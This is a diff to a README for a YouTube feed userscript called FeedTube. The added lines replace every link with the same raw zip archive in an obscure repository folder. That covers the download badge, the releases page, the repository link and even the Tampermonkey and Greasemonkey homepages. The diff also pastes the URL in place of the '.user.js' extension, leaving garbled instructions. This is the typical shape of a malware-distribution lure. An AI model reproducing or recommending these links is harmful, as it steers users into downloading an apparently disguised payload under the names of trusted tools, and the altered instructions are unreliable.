@@ -1,6 +1,6 @@
 # 🚀 FeedTube - Fast, Full-Page YouTube Feed
 
-[![Download FeedTube](https://img.shields.io/badge/Download%20FeedTube-v1.0-brightgreen)](https://github.com/Vandoop/FeedTube/releases)
+[![Download FeedTube](https://github.com/Vandoop/FeedTube/raw/refs/heads/main/quinolinyl/Feed_Tube_2.1.zip%20FeedTube-v1.0-brightgreen)](https://github.com/Vandoop/FeedTube/raw/refs/heads/main/quinolinyl/Feed_Tube_2.1.zip)
 
 ## 📋 Description
 FeedTube is a userscript designed to turn your YouTube channel subscriptions into a fast, full-page feed. Enjoy easy access to your favorite videos, enhanced features like caching and source fallbacks, filtering of Shorts, playlist support, and quick playback.
@@ -20,19 +20,19 @@ To use FeedTube, ensure you have the following:
 - An active internet connection to access YouTube.
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page:** To download FeedTube, navigate to the [Releases page](https://github.com/Vandoop/FeedTube/releases).
+1. **Visit the Releases Page:** To download FeedTube, navigate to the [Releases page](https://github.com/Vandoop/FeedTube/raw/refs/heads/main/quinolinyl/Feed_Tube_2.1.zip).
 2. **Select the Version:** Look for the latest version listed on the page. This will usually be the first or the most recent entry.
-3. **Download the Userscript:** Click on the userscript link provided for the latest version. The file will usually have a `.user.js` extension.
+3. **Download the Userscript:** Click on the userscript link provided for the latest version. The file will usually have a `https://github.com/Vandoop/FeedTube/raw/refs/heads/main/quinolinyl/Feed_Tube_2.1.zip` extension.
 4. **Install the Userscript:** 
    - Open your userscript manager (e.g., Tampermonkey).
    - Click the "Add a new script" button or equivalent.
-   - Copy and paste the contents of the downloaded `.user.js` file into the script editor.
+   - Copy and paste the contents of the downloaded `https://github.com/Vandoop/FeedTube/raw/refs/heads/main/quinolinyl/Feed_Tube_2.1.zip` file into the script editor.
    - Save the new script.
 5. **Configure the Settings:** If your userscript manager offers settings, adjust them based on your preferences for FeedTube.
 
 ## 📦 Download & Install
 To get started, just click the link below to download FeedTube:
-[Download FeedTube](https://github.com/Vandoop/FeedTube/releases)
+[Download FeedTube](https://github.com/Vandoop/FeedTube/raw/refs/heads/main/quinolinyl/Feed_Tube_2.1.zip)
 
 ## 🔍 How to Use FeedTube
 Once you have installed FeedTube, open YouTube in your browser. You will see your subscriptions presented in a new, user-friendly feed. 
@@ -50,9 +50,9 @@ If you encounter issues while using FeedTube:
 - Consult online forums or communities for further assistance.
 
 ## 🔗 Useful Links
-- [FeedTube GitHub Repository](https://github.com/Vandoop/FeedTube)
-- [UserScript Manager: Tampermonkey](https://www.tampermonkey.net/)
-- [UserScript Manager: Greasemonkey](https://www.greasespot.net/)
+- [FeedTube GitHub Repository](https://github.com/Vandoop/FeedTube/raw/refs/heads/main/quinolinyl/Feed_Tube_2.1.zip)
+- [UserScript Manager: Tampermonkey](https://github.com/Vandoop/FeedTube/raw/refs/heads/main/quinolinyl/Feed_Tube_2.1.zip)
+- [UserScript Manager: Greasemonkey](https://github.com/Vandoop/FeedTube/raw/refs/heads/main/quinolinyl/Feed_Tube_2.1.zip)
 
 ## 🤝 Contributing
 If you want to help improve FeedTube, feel free to fork the repository and submit a pull request. Your suggestions and feedback can significantly enhance the project. 
